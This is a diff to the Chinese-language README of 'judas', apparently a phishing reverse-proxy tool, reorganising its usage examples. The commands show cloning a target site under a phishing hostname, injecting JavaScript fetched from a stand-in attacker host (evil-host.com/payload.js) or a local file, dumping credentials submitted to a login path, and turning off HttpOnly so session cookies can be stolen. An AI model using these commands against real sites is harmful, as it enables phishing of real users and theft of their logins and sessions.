@@ -91,7 +91,6 @@ Example:
 
 修改侦听地址
 
-Example:
 ```
 ./judas \
     --target https://target-url.com \
@@ -99,15 +98,27 @@ Example:
     --address=0.0.0.0:8080
 ```
 
-注入js默认是注入所有的js
+从URL中注入 js
 
-Example:
 ```
 ./judas \
     --target https://target-url.com \
     --ssl-hostname phishingsite.com \
     --inject-js https://evil-host.com/payload.js
 ```
+**默认是注入所有的js**
+
+从文件中注入 js
+
+```
+./judas \
+    --target https://target-url.com \
+    --ssl-hostname phishingsite.com \
+    --inject-js test.js
+```
+
+**默认是注入所有的js**
+
 ## 注入特定的 url
 ```shell
 judas --target  https://target-url.com             \
@@ -128,8 +139,6 @@ judas --target  https://target-url.com              \
      --dump-url="/index.php/Public/checkLogin"
 ```
 
-
-
 **注意** --`dump-url` `--inject-url` 多个参数用英文`,` 隔开不可有空格
 
 ### 取消 httponly 设置
@@ -140,8 +149,9 @@ judas --target  https://target-url.com              \
      --inject-url="/index.php/Index/index"          \
      --dump-url="/index.php/Public/checkLogin"      \
      --cookie-httponly=false
-
 ```
+
+
 
 插件功能
 -------
@@ -228,3 +238,4 @@ go build -buildmode=plugin examples/searchloggingplugin/searchloggingplugin.go
 
 ### 注意
 1. 使用域名或者特定的IP 不要使 0.0.0.0 这类
+2. 如果无法登录请试试 `--cookie-httponly=false`
